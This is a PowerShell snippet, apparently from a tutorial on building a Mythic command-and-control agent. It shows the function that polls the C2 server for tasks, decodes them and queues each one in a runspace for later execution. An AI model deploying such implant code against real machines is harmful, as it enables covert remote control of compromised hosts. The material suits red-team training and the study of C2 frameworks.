# Add after agent config
$Script:Jobs = New-Object System.Collections.ArrayList

function Get-Tasking {
    # Create message to receive tasking from Mythic
    $data = [pscustomobject]@{
        action = "get_tasking"
        tasking_size = -1
    } | ConvertTo-Json

    # Display get_tasking data
    Write-Host "`nGet Tasking Data:`n" $data

    # Base64 checkin data
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Agent.UUID+$data))

    # Send checkin data to Mythic server
    $response = Post-Request -data $encoded_data 

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # Display Mythic response
    Write-Host "`nMythic Response:`n" $decoded_data

    # create task object and return if tasking was received
    try {
        $mythic_data = $decoded_data | ConvertFrom-Json
        ForEach ($task in $mythic_data.tasks) {
            $tasking = [pscustomobject]@{
                task_id = $task.id
                command = $task.command
                parameters = $task.parameters
                result = ""
                completed = $false
                started = $false
                error = $false
                pshost = [powershell]::Create()
                runspace = [runspacefactory]::CreateRunspace()
                job_object = $null
            }
            $Script:Jobs.Add($tasking) | Out-Null
        }
    }
    catch {
        continue
    }
}

# Check jobs list
Write-Host "`nJobs:`n" $Script:Jobs

# Get new taskings
Get-Tasking

# Check updated jobs list
Write-Host "`nJobs:`n" $Script:Jobs
